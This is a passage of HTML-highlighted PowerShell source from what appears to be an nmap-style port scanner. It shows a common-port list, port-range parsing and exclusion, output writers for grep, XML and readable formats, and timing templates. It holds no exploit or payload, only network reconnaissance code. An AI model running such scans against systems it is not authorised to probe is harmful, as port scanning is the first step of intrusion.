class="hljs-number">5998</span>,<span class="hljs-number">9929</span>,<span class="hljs-number">31337</span>,<span class="hljs-number">44442</span>,<br>                        <span class="hljs-number">1092</span>,<span class="hljs-number">1095</span>,<span class="hljs-number">1102</span>,<span class="hljs-number">1105</span>,<span class="hljs-number">1113</span>,<span class="hljs-number">1121</span>,<span class="hljs-number">1123</span>,<span class="hljs-number">1126</span>,<span class="hljs-number">1130</span>,<span class="hljs-number">1132</span>,<span class="hljs-number">1137</span>,<span class="hljs-number">1141</span>,<span class="hljs-number">1145</span>,<span class="hljs-number">1147</span>,<span class="hljs-number">1149</span>,<span class="hljs-number">1154</span>,<br>                        <span class="hljs-number">1164</span>,<span class="hljs-number">1165</span>,<span class="hljs-number">1166</span>,<span class="hljs-number">1174</span>,<span class="hljs-number">1185</span>,<span class="hljs-number">1187</span>,<span class="hljs-number">1192</span>,<span class="hljs-number">1198</span>,<span class="hljs-number">1213</span>,<span class="hljs-number">1216</span>,<span class="hljs-number">1217</span>,<span class="hljs-number">1233</span>,<span class="hljs-number">1236</span>,<span class="hljs-number">1244</span>,<span class="hljs-number">1259</span>,<span class="hljs-number">1277</span>,<br>                        <span class="hljs-number">1287</span>,<span class="hljs-number">1300</span>,<span class="hljs-number">1301</span>,<span class="hljs-number">1309</span>,<span class="hljs-number">1322</span>,<span class="hljs-number">1328</span>,<span class="hljs-number">1556</span>,<span class="hljs-number">1641</span>,<span class="hljs-number">1688</span>,<span class="hljs-number">1719</span>,<span class="hljs-number">1721</span>,<span class="hljs-number">1805</span>,<span class="hljs-number">1812</span>,<span class="hljs-number">1839</span>,<span class="hljs-number">1875</span>,<span class="hljs-number">1914</span>,<br>                        <span class="hljs-number">1971</span>,<span class="hljs-number">1972</span>,<span class="hljs-number">1974</span>,<span class="hljs-number">2099</span>,<span class="hljs-number">2170</span>,<span class="hljs-number">2196</span>,<span class="hljs-number">2200</span>,<span class="hljs-number">2288</span>,<span class="hljs-number">2366</span>,<span class="hljs-number">2382</span>,<span class="hljs-number">2557</span>,<span class="hljs-number">2800</span>,<span class="hljs-number">2910</span>,<span class="hljs-number">2920</span>,<span class="hljs-number">2968</span>,<span class="hljs-number">3007</span>,<br>                        <span class="hljs-number">3013</span>,<span class="hljs-number">3050</span>,<span class="hljs-number">3119</span>,<span class="hljs-number">3304</span>,<span class="hljs-number">3307</span>,<span class="hljs-number">3376</span>,<span class="hljs-number">3400</span>,<span class="hljs-number">3410</span>,<span class="hljs-number">3514</span>,<span class="hljs-number">3684</span>,<span class="hljs-number">3697</span>,<span class="hljs-number">3700</span>,<span class="hljs-number">3824</span>,<span class="hljs-number">3846</span>,<span class="hljs-number">3848</span>,<span class="hljs-number">3859</span>,<br>                        <span class="hljs-number">3863</span>,<span class="hljs-number">3870</span>,<span class="hljs-number">3872</span>,<span class="hljs-number">3888</span>,<span class="hljs-number">3907</span>,<span class="hljs-number">3916</span>,<span class="hljs-number">3931</span>,<span class="hljs-number">3941</span>,<span class="hljs-number">3957</span>,<span class="hljs-number">3963</span>,<span class="hljs-number">3968</span>,<span class="hljs-number">3969</span>,<span class="hljs-number">3972</span>,<span class="hljs-number">3990</span>,<span class="hljs-number">3993</span>,<span class="hljs-number">3994</span>,<br>                        <span class="hljs-number">4009</span>,<span class="hljs-number">4040</span>,<span class="hljs-number">4080</span>,<span class="hljs-number">4096</span>,<span class="hljs-number">4143</span>,<span class="hljs-number">4147</span>,<span class="hljs-number">4200</span>,<span class="hljs-number">4252</span>,<span class="hljs-number">4430</span>,<span class="hljs-number">4555</span>,<span class="hljs-number">4600</span>,<span class="hljs-number">4658</span>,<span class="hljs-number">4875</span>,<span class="hljs-number">4949</span>,<span class="hljs-number">5040</span>,<span class="hljs-number">5063</span>,<br>                        <span class="hljs-number">5074</span>,<span class="hljs-number">5151</span>,<span class="hljs-number">5212</span>,<span class="hljs-number">5223</span>,<span class="hljs-number">5242</span>,<span class="hljs-number">5279</span>,<span class="hljs-number">5339</span>,<span class="hljs-number">5353</span>,<span class="hljs-number">5501</span>,<span class="hljs-number">5807</span>,<span class="hljs-number">5812</span>,<span class="hljs-number">5818</span>,<span class="hljs-number">5823</span>,<span class="hljs-number">5868</span>,<span class="hljs-number">5869</span>,<span class="hljs-number">5899</span>,<br>                        <span class="hljs-number">5905</span>,<span class="hljs-number">5909</span>,<span class="hljs-number">5914</span>,<span class="hljs-number">5918</span>,<span class="hljs-number">5938</span>,<span class="hljs-number">5940</span>,<span class="hljs-number">5968</span>,<span class="hljs-number">5981</span>,<span class="hljs-number">6051</span>,<span class="hljs-number">6060</span>,<span class="hljs-number">6068</span>,<span class="hljs-number">6203</span>,<span class="hljs-number">6247</span>,<span class="hljs-number">6500</span>,<span class="hljs-number">6504</span>,<span class="hljs-number">6520</span>,<br>                        <span class="hljs-number">6550</span>,<span class="hljs-number">6600</span>)<br>            <span class="hljs-variable">$numPorts</span>--<br>            <span class="hljs-variable">$portList</span>.AddRange(<span class="hljs-variable">$topPortList</span>[<span class="hljs-number">0</span><span class="hljs-type">..</span><span class="hljs-variable">$numPorts</span>])<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Parse-Ports</span></span><br>        &#123;<br>            <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$Ports</span>,<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] <span class="hljs-variable">$pList</span><br>            )<br><br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$pRange</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$Ports</span>.Split(<span class="hljs-string">&quot;,&quot;</span>))<br>            &#123;<br><br>                <span class="hljs-comment">#-1 is a special case for ping</span><br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pRange</span> <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;-1&quot;</span>)<br>                &#123;<br>                    <span class="hljs-variable">$pList</span>.Add([<span class="hljs-built_in">int</span>]<span class="hljs-variable">$pRange</span>)<br>                &#125;<br>                <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$pRange</span>.Contains(<span class="hljs-string">&quot;-&quot;</span>))<br>                &#123;<br>                    [<span class="hljs-built_in">int</span>[]] <span class="hljs-variable">$range</span> = <span class="hljs-variable">$pRange</span>.Split(<span class="hljs-string">&quot;-&quot;</span>)<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$range</span>.Count <span class="hljs-operator">-ne</span> <span class="hljs-number">2</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$pRange</span>.Split(<span class="hljs-string">&quot;-&quot;</span>)[<span class="hljs-number">0</span>] <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;&quot;</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$pRange</span>.split(<span class="hljs-string">&quot;-&quot;</span>)[<span class="hljs-number">1</span>] <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;&quot;</span>)<br>                    &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Invalid port range&quot;</span><br>                    &#125;<br><br>                    <span class="hljs-variable">$pList</span>.AddRange(<span class="hljs-variable">$range</span>[<span class="hljs-number">0</span>]..<span class="hljs-variable">$range</span>[<span class="hljs-number">1</span>])<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    <span class="hljs-variable">$pList</span>.Add([<span class="hljs-built_in">int</span>]<span class="hljs-variable">$pRange</span>)<br>                &#125;<br><br>            &#125;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$p</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$pList</span>)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$p</span> <span class="hljs-operator">-lt</span> <span class="hljs-literal">-1</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$p</span> <span class="hljs-operator">-gt</span> <span class="hljs-number">65535</span>)<br>                &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Port <span class="hljs-variable">$p</span> out of range&quot;</span><br>                &#125;<br>            &#125;<br>         &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Parse-IpPorts</span></span><br>        &#123;<br>           <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$PortFile</span><br>            )<br><br>            <span class="hljs-built_in">Get-Content</span> <span class="hljs-variable">$PortFile</span> | <span class="hljs-built_in">ForEach-Object</span> &#123;<br>                Parse<span class="hljs-literal">-Ports</span> <span class="hljs-literal">-Ports</span> <span class="hljs-variable">$_</span> <span class="hljs-literal">-pList</span> <span class="hljs-variable">$portList</span><br>            &#125;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Remove-Ports</span></span><br>        &#123;<br>            <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">string</span>] <span class="hljs-variable">$ExcludedPorts</span><br>            )<br><br>            [<span class="hljs-built_in">int</span>[]] <span class="hljs-variable">$ExcludedPorts</span> = <span class="hljs-variable">$ExcludedPorts</span>.Split(<span class="hljs-string">&quot;,&quot;</span>)<br><br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$x</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$ExcludedPorts</span>)<br>            &#123;<br>                <span class="hljs-variable">$portList</span>.Remove(<span class="hljs-variable">$x</span>)<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Write-PortscanOut</span></span><br>        &#123;<br>            <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>, <span class="hljs-type">ParameterSetName</span>=<span class="hljs-string">&quot;Comment&quot;</span>)] [<span class="hljs-built_in">string</span>] <span class="hljs-variable">$comment</span>,<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>, <span class="hljs-type">ParameterSetName</span>=<span class="hljs-string">&quot;HostOut&quot;</span>)] [<span class="hljs-built_in">string</span>] <span class="hljs-variable">$outhost</span>,<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>, <span class="hljs-type">ParameterSetName</span>=<span class="hljs-string">&quot;HostOut&quot;</span>)] [<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$isUp</span>,<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>, <span class="hljs-type">ParameterSetName</span>=<span class="hljs-string">&quot;HostOut&quot;</span>)] <span class="hljs-variable">$openPorts</span>,<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>, <span class="hljs-type">ParameterSetName</span>=<span class="hljs-string">&quot;HostOut&quot;</span>)] <span class="hljs-variable">$closedPorts</span>,<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>, <span class="hljs-type">ParameterSetName</span>=<span class="hljs-string">&quot;HostOut&quot;</span>)] <span class="hljs-variable">$filteredPorts</span>,<br>                [<span class="hljs-type">Parameter</span>()] [<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$SkipDiscovery</span>,<br>                [<span class="hljs-type">Parameter</span>()] [<span class="hljs-type">System.IO.StreamWriter</span>] <span class="hljs-variable">$grepStream</span>,<br>                [<span class="hljs-type">Parameter</span>()] [<span class="hljs-type">System.Xml.XmlWriter</span>] <span class="hljs-variable">$xmlStream</span>,<br>                [<span class="hljs-type">Parameter</span>()] [<span class="hljs-type">System.IO.StreamWriter</span>] <span class="hljs-variable">$readableStream</span><br><br>            )<br>            <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$PSCmdlet</span>.ParameterSetName)<br>            &#123;<br>                <span class="hljs-string">&quot;Comment&quot;</span><br>                &#123;<br><br>                    <span class="hljs-built_in">Write-Verbose</span> <span class="hljs-variable">$comment</span><br><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$grepStream</span>) &#123;<br>                        <span class="hljs-variable">$grepStream</span>.WriteLine(<span class="hljs-string">&quot;# &quot;</span> + <span class="hljs-variable">$comment</span>)<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$xmlStream</span>) &#123;<br>                        <span class="hljs-variable">$xmlStream</span>.WriteComment(<span class="hljs-variable">$comment</span>)<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$readableStream</span>) &#123;<br>                        <span class="hljs-variable">$readableStream</span>.WriteLine(<span class="hljs-variable">$comment</span>)<br>                    &#125;<br>                &#125;<br>                <span class="hljs-string">&quot;HostOut&quot;</span><br>                &#123;<br>                    <span class="hljs-variable">$oPort</span> = [<span class="hljs-built_in">string</span>]::join(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-variable">$openPorts</span>.ToArray())<br>                    <span class="hljs-variable">$cPort</span> = [<span class="hljs-built_in">string</span>]::join(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-variable">$closedPorts</span>.ToArray())<br>                    <span class="hljs-variable">$fPort</span> = [<span class="hljs-built_in">string</span>]::join(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-variable">$filteredPorts</span>.ToArray())<br><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$grepStream</span>) &#123;<br>                       <span class="hljs-comment">#for grepstream use tabs - can be ugly, but easier for regex</span><br>                       <span class="hljs-keyword">if</span> (<span class="hljs-variable">$isUp</span> <span class="hljs-operator">-and</span> !<span class="hljs-variable">$SkipDiscovery</span>) &#123;<br>                            <span class="hljs-variable">$grepStream</span>.writeline(<span class="hljs-string">&quot;Host: <span class="hljs-variable">$outhost</span>`tStatus: Up&quot;</span>)<br>                        &#125;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$isUp</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$SkipDiscovery</span>) &#123;<br>                            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$oPort</span> <span class="hljs-operator">-ne</span> <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                                <span class="hljs-variable">$grepStream</span>.writeline(<span class="hljs-string">&quot;Host: <span class="hljs-variable">$outhost</span>`tOpen Ports: <span class="hljs-variable">$oPort</span>&quot;</span>)<br>                            &#125;<br>                            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$cPort</span> <span class="hljs-operator">-ne</span> <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                                <span class="hljs-variable">$grepStream</span>.writeline(<span class="hljs-string">&quot;Host: <span class="hljs-variable">$outhost</span>`tClosed Ports: <span class="hljs-variable">$cPort</span>&quot;</span>)<br>                            &#125;<br>                            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$fPort</span> <span class="hljs-operator">-ne</span> <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                                <span class="hljs-variable">$grepStream</span>.writeline(<span class="hljs-string">&quot;Host: <span class="hljs-variable">$outhost</span>`tFiltered Ports: <span class="hljs-variable">$fPort</span>&quot;</span>)<br>                            &#125;<br>                        &#125;<br>                        <span class="hljs-keyword">elseif</span> (!<span class="hljs-variable">$SkipDiscovery</span>) &#123;<br>                            <span class="hljs-variable">$grepStream</span>.writeline(<span class="hljs-string">&quot;Host: <span class="hljs-variable">$outhost</span>`tStatus: Down&quot;</span>)<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$xmlStream</span>) &#123;<br>                        <span class="hljs-variable">$xmlStream</span>.WriteStartElement(<span class="hljs-string">&quot;Host&quot;</span>)<br><br>                        <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;id&quot;</span>, <span class="hljs-variable">$outhost</span>)<br>                        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$SkipDiscovery</span>) &#123;<br>                            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$isUp</span>) &#123;<br>                                <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;Status&quot;</span>, <span class="hljs-string">&quot;Up&quot;</span>)<br>                             &#125;<br>                             <span class="hljs-keyword">else</span> &#123;<br>                                <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;Status&quot;</span>, <span class="hljs-string">&quot;Downs&quot;</span>)<br>                             &#125;<br>                        &#125;<br><br>                        <span class="hljs-variable">$xmlStream</span>.WriteStartElement(<span class="hljs-string">&quot;Ports&quot;</span>)<br>                        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$p</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$openPorts</span>) &#123;<br>                            <span class="hljs-variable">$xmlStream</span>.writestartElement(<span class="hljs-string">&quot;Port&quot;</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;id&quot;</span>, [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$p</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;state&quot;</span>, <span class="hljs-string">&quot;open&quot;</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteEndElement()<br><br>                        &#125;<br>                        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$p</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$closedPorts</span>) &#123;<br>                            <span class="hljs-variable">$xmlStream</span>.writestartElement(<span class="hljs-string">&quot;Port&quot;</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;id&quot;</span>, [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$p</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;state&quot;</span>, <span class="hljs-string">&quot;closed&quot;</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteEndElement()<br>                        &#125;<br>                        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$p</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$filteredPorts</span>) &#123;<br>                            <span class="hljs-variable">$xmlStream</span>.writestartElement(<span class="hljs-string">&quot;Port&quot;</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;id&quot;</span>, [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$p</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;state&quot;</span>, <span class="hljs-string">&quot;filtered&quot;</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteEndElement()<br>                        &#125;<br><br>                        <span class="hljs-variable">$xmlStream</span>.WriteEndElement()<br>                        <span class="hljs-variable">$xmlStream</span>.WriteEndElement()<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$readableStream</span>) &#123;<br>                        <span class="hljs-variable">$readableStream</span>.writeline(<span class="hljs-string">&quot;Porscan.ps1 scan report for <span class="hljs-variable">$outhost</span>&quot;</span>)<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$isUp</span>) &#123;<br>                            <span class="hljs-variable">$readableStream</span>.writeline(<span class="hljs-string">&quot;Host is up&quot;</span>)<br>                        &#125;<br><br>                        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$isUp</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$SkipDiscovery</span>) &#123;<br><br>                            <span class="hljs-variable">$readableStream</span>.writeline((<span class="hljs-string">&quot;&#123;0,-10&#125;&#123;1,0&#125;&quot;</span> <span class="hljs-operator">-f</span> <span class="hljs-string">&quot;PORT&quot;</span>, <span class="hljs-string">&quot;STATE&quot;</span>))<br><br>                            [<span class="hljs-built_in">int</span>[]]<span class="hljs-variable">$allports</span> = <span class="hljs-variable">$openPorts</span> + <span class="hljs-variable">$closedPorts</span> + <span class="hljs-variable">$filteredPorts</span><br>                            <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$p</span> <span class="hljs-keyword">in</span> (<span class="hljs-variable">$allports</span>| <span class="hljs-built_in">Sort-Object</span>))<br>                            &#123;<br>                                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$openPorts</span>.Contains(<span class="hljs-variable">$p</span>)) &#123;<br>                                    <span class="hljs-variable">$readableStream</span>.writeline((<span class="hljs-string">&quot;&#123;0,-10&#125;&#123;1,0&#125;&quot;</span> <span class="hljs-operator">-f</span> <span class="hljs-variable">$p</span>, <span class="hljs-string">&quot;open&quot;</span>))<br>                                &#125;<br>                                <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$closedPorts</span>.Contains(<span class="hljs-variable">$p</span>)) &#123;<br>                                    <span class="hljs-variable">$readableStream</span>.writeline((<span class="hljs-string">&quot;&#123;0,-10&#125;&#123;1,0&#125;&quot;</span> <span class="hljs-operator">-f</span> <span class="hljs-variable">$p</span>, <span class="hljs-string">&quot;closed&quot;</span>))<br>                                &#125;<br>                                <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$filteredPorts</span>.Contains(<span class="hljs-variable">$p</span>)) &#123;<br>                                    <span class="hljs-variable">$readableStream</span>.writeline((<span class="hljs-string">&quot;&#123;0,-10&#125;&#123;1,0&#125;&quot;</span> <span class="hljs-operator">-f</span> <span class="hljs-variable">$p</span>, <span class="hljs-string">&quot;filtered&quot;</span>))<br>                                &#125;<br>                            &#125;<br><br>                        &#125;<br>                        <span class="hljs-keyword">elseif</span>(!<span class="hljs-variable">$SkipDiscovery</span>) &#123;<br>                            <span class="hljs-variable">$readableStream</span>.writeline(<span class="hljs-string">&quot;Host is Down&quot;</span>)<br>                        &#125;<br>                        <span class="hljs-variable">$readableStream</span>.writeline(<span class="hljs-string">&quot;&quot;</span>)<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">#function for Powershell v2.0 to work</span><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Convert-SwitchtoBool</span></span><br>        &#123;<br>            <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] <span class="hljs-variable">$switchValue</span><br>            )<br>            <span class="hljs-keyword">If</span> (<span class="hljs-variable">$switchValue</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$True</span><br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$False</span><br>        &#125;<br><br>        <span class="hljs-keyword">try</span><br>        &#123;<br><br>            [<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$SkipDiscovery</span> = <span class="hljs-built_in">Convert-SwitchtoBool</span> (<span class="hljs-variable">$SkipDiscovery</span>)<br>            [<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$PingOnly</span> = <span class="hljs-built_in">Convert-SwitchtoBool</span> (<span class="hljs-variable">$PingOnly</span>)<br>            [<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$quiet</span>  = <span class="hljs-built_in">Convert-SwitchtoBool</span> (<span class="hljs-variable">$quiet</span>)<br>            [<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$ForceOverwrite</span>  = <span class="hljs-built_in">Convert-SwitchtoBool</span> (<span class="hljs-variable">$ForceOverwrite</span>)<br><br>            <span class="hljs-comment">#########</span><br>            <span class="hljs-comment">#parse arguments</span><br>            <span class="hljs-comment">#########</span><br><br>            [<span class="hljs-type">Environment</span>]::CurrentDirectory=(<span class="hljs-built_in">Get-Location</span> <span class="hljs-literal">-PSProvider</span> FileSystem).ProviderPath<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$PsCmdlet</span>.ParameterSetName <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;cmdHosts&quot;</span>)<br>            &#123;<br>                <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$h</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$Hosts</span>)<br>                &#123;<br>                    Parse<span class="hljs-literal">-Hosts</span>(<span class="hljs-variable">$h</span>) | <span class="hljs-built_in">Out-Null</span><br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                Parse<span class="hljs-literal">-ILHosts</span>(<span class="hljs-variable">$HostFile</span>) | <span class="hljs-built_in">Out-Null</span><br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$ExcludeHosts</span>)<br>            &#123;<br>                Exclude<span class="hljs-literal">-Hosts</span>(<span class="hljs-variable">$ExcludeHosts</span>)<br>            &#125;<br>            <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$TopPorts</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$Ports</span>) <span class="hljs-operator">-or</span> (<span class="hljs-variable">$TopPorts</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$PortFile</span>))<br>            &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Cannot set topPorts with other specific ports&quot;</span><br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$Ports</span>)<br>            &#123;<br>                Parse<span class="hljs-literal">-Ports</span> <span class="hljs-literal">-Ports</span> <span class="hljs-variable">$Ports</span> <span class="hljs-literal">-pList</span> <span class="hljs-variable">$portList</span> | <span class="hljs-built_in">Out-Null</span><br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$PortFile</span>)<br>            &#123;<br>                Parse<span class="hljs-literal">-IpPorts</span>(<span class="hljs-variable">$PortFile</span>) | <span class="hljs-built_in">Out-Null</span><br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$portList</span>.Count <span class="hljs-operator">-eq</span> <span class="hljs-number">0</span>)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$TopPorts</span>)<br>                &#123;<br>                    <span class="hljs-built_in">Get-TopPort</span>(<span class="hljs-variable">$TopPorts</span>) | <span class="hljs-built_in">Out-Null</span><br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    <span class="hljs-comment">#if the ports still aren&#x27;t set, give the deftault, top 50 ports</span><br>                    <span class="hljs-built_in">Get-TopPort</span>(<span class="hljs-number">50</span>) | <span class="hljs-built_in">Out-Null</span><br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$ExcludedPorts</span>)<br>            &#123;<br>                <span class="hljs-built_in">Remove-Ports</span> <span class="hljs-literal">-ExcludedPorts</span> <span class="hljs-variable">$ExcludedPorts</span> | <span class="hljs-built_in">Out-Null</span><br>            &#125;<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$T</span>)<br>            &#123;<br>                <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$T</span>)<br>                &#123;<br>                    <span class="hljs-number">5</span> &#123;<span class="hljs-variable">$nHosts</span>=<span class="hljs-number">30</span>;  <span class="hljs-variable">$Threads</span> = <span class="hljs-number">1000</span>; <span class="hljs-variable">$Timeout</span> = <span class="hljs-number">750</span> &#125;<br>                    <span class="hljs-number">4</span> &#123;<span class="hljs-variable">$nHosts</span>=<span class="hljs-number">25</span>;  <span class="hljs-variable">$Threads</span> = <span class="hljs-number">1000</span>; <span class="hljs-variable">$Timeout</span> = <span class="hljs-number">1200</span> &#125;<br>                    <span class="hljs-number">3</span> &#123;<span class="hljs-variable">$nHosts</span>=<span class="hljs-number">20</span>;  <span class="hljs-variable">$Threads</span> = <span class="hljs-number">100</span>;  <span class="hljs-variable">$Timeout</span> = <span class="hljs-number">2500</span> &#125;<br>                    <span class="hljs-number">2</span> &#123;<span class="hljs-variable">$nHosts</span>=<span class="hljs-number">15</span>;  <span class="hljs-variable">$Threads</span> = <span class="hljs-number">32</span>;   <span class="hljs-variable">$Timeout</span> = <span class="hljs-number">3000</span> &#125;<br>                    <span class="hljs-number">1</span> &#123;<span class="hljs-variable">$nHosts</span>=<span class="hljs-number">10</span>;  <span class="hljs-variable">$Threads</span> = <span class="hljs-number">32</span>;   <span class="hljs-variable">$Timeout</span> = <span class="hljs-number">5000</span> &#125;<br>                    default &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Invalid T parameter&quot;</span><br>                    &#125;<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-variable">$grepStream</span> = <span class="hljs-variable">$null</span><br>            <span class="hljs-variable">$xmlStream</span> = <span class="hljs-variable">$null</span><br>            <span class="hljs-variable">$readableStream</span> = <span class="hljs-variable">$null</span><br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$AllformatsOut</span>)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$GrepOut</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$XmlOut</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$ReadableOut</span>) &#123;<br>                     <span class="hljs-built_in">Write-Warning</span> <span class="hljs-string">&quot;Both -oA specified with other output... going to ignore -oG/-oN/-oX&quot;</span><br>                &#125;<br>                <span class="hljs-variable">$GrepOut</span> = <span class="hljs-variable">$AllformatsOut</span> + <span 